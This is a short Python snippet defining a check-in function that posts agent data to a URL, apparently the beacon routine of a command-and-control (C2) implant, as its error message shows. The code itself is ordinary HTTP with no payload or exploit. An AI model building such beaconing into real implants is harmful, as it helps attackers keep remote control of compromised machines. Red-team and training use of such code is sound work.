import requests


def perform_checkin(api_url, agent_data):
    try:
        response = requests.post(api_url, json=agent_data, timeout=10)

        response.raise_for_status()

        return response.json()

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Error in communication with C2: {e}")

        return None
